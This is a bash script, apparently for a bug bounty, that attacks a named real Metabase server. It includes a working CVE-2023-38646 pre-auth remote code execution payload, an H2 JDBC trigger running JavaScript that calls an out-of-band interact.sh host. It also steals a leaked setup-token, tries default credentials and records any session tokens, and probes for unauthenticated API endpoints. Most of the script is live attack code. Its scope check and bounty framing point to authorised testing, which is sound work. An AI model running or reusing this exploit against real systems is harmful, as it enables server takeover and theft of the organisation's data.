#!/usr/bin/env bash
# metabase-photomath-attack.sh
# Targeted attack on metabase.photomath.net — Photomath TIER0, Google VRP.
#
# Primary hypothesis: CVE-2023-38646 (pre-auth RCE via JDBC injection, Metabase < 0.46.6.1)
# Secondary: Post-auth IDOR on dashboards/questions/cards
# Tertiary: Default credentials (admin@company.com / metabot#1, admin/admin)
#
# Run from Pi: bash scripts/metabase-photomath-attack.sh
set -euo pipefail

TARGET="metabase.photomath.net"
OUT="results/photomath.net/metabase"
mkdir -p "$OUT/evidence"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
hit()  { echo -e "${RED}[CRITICAL HIT]${NC} $*"; }
ok()   { echo -e "${GREEN}[OK]${NC} $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }
warn() { echo -e "${YELLOW}[?]${NC} $*"; }

# Scope gate
SCOPE=$(bash scripts/scope-check.sh "$TARGET" 2>/dev/null || true)
case "$SCOPE" in IN-SCOPE*) ok "Scope OK: $SCOPE" ;; *)
  echo "OUT-OF-SCOPE: $SCOPE — aborting" >&2; exit 2 ;;
esac

echo ""
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  Metabase Attack — $TARGET (TIER0, Google VRP)           ${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo ""

BASE="https://$TARGET"

# ─── Step 0: Fingerprint ────────────────────────────────────────────────────
info "Step 0: Fingerprint ($TARGET)"
HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" "$BASE/" 2>/dev/null)
echo "  HTTP $HTTP_CODE"
if [ "$HTTP_CODE" = "000" ]; then
  warn "Host unreachable — may be internal-only. Try: curl -sk https://$TARGET/"
  exit 0
fi

# Get version from /api/health
HEALTH=$(curl -sk -H "User-Agent: $UA" "$BASE/api/health" 2>/dev/null)
echo "  /api/health: $HEALTH" | tee "$OUT/evidence/health.txt"
VERSION=$(echo "$HEALTH" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('version',{}).get('tag','unknown'))" 2>/dev/null || echo "unknown")
echo "  Version: $VERSION" | tee -a "$OUT/evidence/health.txt"

# Check setup state (un-configured = game over)
SETUP=$(curl -sk -H "User-Agent: $UA" "$BASE/api/session/properties" 2>/dev/null)
SETUP_TOKEN=$(echo "$SETUP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('setup-token','none'))" 2>/dev/null || echo "none")
if [ "$SETUP_TOKEN" != "none" ] && [ "$SETUP_TOKEN" != "null" ] && [ -n "$SETUP_TOKEN" ]; then
  hit "Metabase UNCONFIGURED — setup-token exposed: $SETUP_TOKEN"
  hit "Full admin access via POST /api/setup — highest severity"
  echo "setup-token: $SETUP_TOKEN" >> "$OUT/evidence/setup-token.txt"
fi
echo ""

# ─── Step 1: CVE-2023-38646 — Pre-auth RCE via setup/validate ──────────────
info "Step 1: CVE-2023-38646 — Pre-auth RCE (JDBC injection via /api/setup/validate)"
# Requires setup-token from /api/session/properties
# If setup-token is null, the instance is initialized — CVE may still be exploitable
# via the /api/setup/validate endpoint in older versions (some bypasses exist)
echo "  Setup token: ${SETUP_TOKEN:-null}"

# Try the PoC regardless (some versions validate even without setup mode)
INTERACTSH_URL="${INTERACTSH_URL:-https://REPLACE_WITH_INTERACTSH_ID.interact.sh}"
CVE_PAYLOAD=$(cat <<EOF
{
  "token": "$SETUP_TOKEN",
  "details": {
    "is_on_demand": false,
    "is_full_sync": false,
    "is_sample": false,
    "cache_ttl": null,
    "refingerprint": false,
    "auto_run_queries": true,
    "schedules": {},
    "details": {
      "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\\\;CREATE TRIGGER pwntest BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\nnew java.net.URL('$INTERACTSH_URL/cve-2023-38646').openConnection().getResponseCode()\\n$$--=x",
      "advanced-options": false,
      "ssl": false
    },
    "name": "test",
    "engine": "h2"
  }
}
EOF
)

CVE_RESP=$(curl -sk -X POST -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "$CVE_PAYLOAD" "$BASE/api/setup/validate" 2>/dev/null)
echo "  /api/setup/validate response: $(echo "$CVE_RESP" | head -c 200)"
echo "$CVE_RESP" > "$OUT/evidence/cve-2023-38646-response.txt"

if echo "$CVE_RESP" | grep -qiE "error.*setup|setup.*token|forbidden|not found|disabled"; then
  ok "CVE-2023-38646 endpoint not exploitable (patched or disabled)"
else
  warn "Endpoint responded unexpectedly — check OOB listener and $OUT/evidence/cve-2023-38646-response.txt"
  warn "If INTERACTSH_URL is set and receives a hit: CRITICAL RCE confirmed"
fi
echo ""

# ─── Step 2: Nuclei targeted scan for Metabase CVEs ─────────────────────────
info "Step 2: Nuclei targeted scan (Metabase + default-creds + exposure templates)"
if command -v nuclei >/dev/null 2>&1; then
  nuclei -u "$BASE" -silent \
    -tags "metabase,default-login,exposure,panel" \
    -severity "critical,high,medium" \
    -rate-limit 20 -timeout 10 \
    -j -o "$OUT/evidence/nuclei-metabase.jsonl" 2>/dev/null || true
  HITS=$(wc -l < "$OUT/evidence/nuclei-metabase.jsonl" 2>/dev/null || echo 0)
  echo "  Nuclei hits: $HITS"
  [ "$HITS" -gt 0 ] && hit "Nuclei found $HITS issues:" && cat "$OUT/evidence/nuclei-metabase.jsonl"
else
  warn "nuclei not found in PATH"
fi
echo ""

# ─── Step 3: Default credential test ────────────────────────────────────────
info "Step 3: Default credential test (Metabase common defaults)"
declare -A CREDS=(
  ["admin@metabase.local"]="password"
  ["admin@company.com"]="password"
  ["admin@photomath.com"]="password"
  ["admin@photomath.net"]="password"
  ["admin@google.com"]="password"
  ["test@test.com"]="test123"
)
for EMAIL in "${!CREDS[@]}"; do
  PASS="${CREDS[$EMAIL]}"
  RESP=$(curl -sk -X POST -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"username\":\"$EMAIL\",\"password\":\"$PASS\"}" \
    "$BASE/api/session" 2>/dev/null)
  if echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); exit(0 if 'id' in d else 1)" 2>/dev/null; then
    hit "DEFAULT CREDS WORK: $EMAIL / $PASS"
    TOKEN=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
    echo "Session token: $TOKEN" >> "$OUT/evidence/default-creds.txt"
    echo "Credentials: $EMAIL / $PASS" >> "$OUT/evidence/default-creds.txt"
  else
    echo "  $EMAIL → rejected"
  fi
done
echo ""

# ─── Step 4: Unauthenticated API exposure ───────────────────────────────────
info "Step 4: Unauthenticated API endpoint exposure"
for ep in \
  "/api/database" \
  "/api/user" \
  "/api/dashboard" \
  "/api/card" \
  "/api/collection" \
  "/api/activity" \
  "/api/pulse" \
  "/api/permissions/group" \
  "/api/setting" \
  "/api/tables" \
  "/api/field" \
  "/api/metric"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: $UA" "$BASE$ep" 2>/dev/null)
  echo -n "  $ep → HTTP $CODE"
  if [ "$CODE" = "200" ]; then
    BODY=$(curl -sk -H "User-Agent: $UA" "$BASE$ep" 2>/dev/null | head -c 200)
    echo " ← OPEN"
    hit "Unauthenticated access to $ep"
    echo "$BODY" >> "$OUT/evidence/unauth-endpoints.txt"
  else
    echo ""
  fi
done
echo ""

# ─── Summary ─────────────────────────────────────────────────────────────────
echo -e "${CYAN}═══ Metabase Attack Summary ═══${NC}"
echo "  Target:  $TARGET"
echo "  Version: $VERSION"
echo "  Evidence: $OUT/evidence/"
echo ""
echo "  If setup-token was found → CRITICAL (full admin takeover, no auth)"
echo "  If nuclei RCE hit  → CRITICAL ($101,010 TIER0 max)"
echo "  If default creds  → HIGH (authenticated access to BI data + connectors)"
echo "  If unauth endpoint → MEDIUM-HIGH (data exposure)"
